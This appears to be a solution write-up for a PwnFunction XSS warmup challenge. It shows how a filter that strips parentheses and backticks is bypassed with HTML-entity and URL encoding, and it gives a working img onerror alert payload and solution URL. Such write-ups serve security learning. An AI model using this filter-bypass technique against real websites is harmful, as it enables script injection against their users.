# Ah That's Hawt - Exercise 4

[Problem](https://xss.pwnfunction.com/warmups/thats-hawt/)

[Solution](https://sandbox.pwnfunction.com/warmups/thats-hawt.html?markassbrownlee=%3Cimg%20src=%22idk.png%22%20onerror=%22alert%26%2340%3B1337%26%2341%3B%22%3E)

## Explanation

Here is the part to inject JS

```html
<h2 id="will"></h2>
<script>
    smith = (new URL(location).searchParams.get('markassbrownlee') || "Ah That's Hawt")
    smith = smith.replace(/[\(\`\)\\]/g, '')
    will.innerHTML = smith
</script>
```

Here, you have access to the variable smith, which later becomes the content inside the h2 *will*. Notice that the characters `\`, `(`, `)`, `\`` are replaced by empty string in smith. We can still **HTML escape** Encode such characters, which will give the same result.

Tag we wanna inject - `<img src="idk.png" onerror="alert(1377)">`

After HTML escape encoding - `<img src="idk.png" onerror="alert&#40;1337&#41;">`

We still have special characters like `#` and `&`. We can HTML URL Encode them (not escape encoding).

Final product - `<img src="idk.png" onerror="alert%26%2340%3B1337%26%2341%3B">`

Set this as the value of the parameter *markassbrownlee* which will assign it to the variable smith. It will trigger the alert function as the image tag throws an error. Neat

### This Might Help

- [Check for regex match](https://regex101.com/)
- [HTML Escape Encoding](https://mateam.net/html-escape-characters/)
- [HTML URL Encoding](https://www.urlencoder.org/)
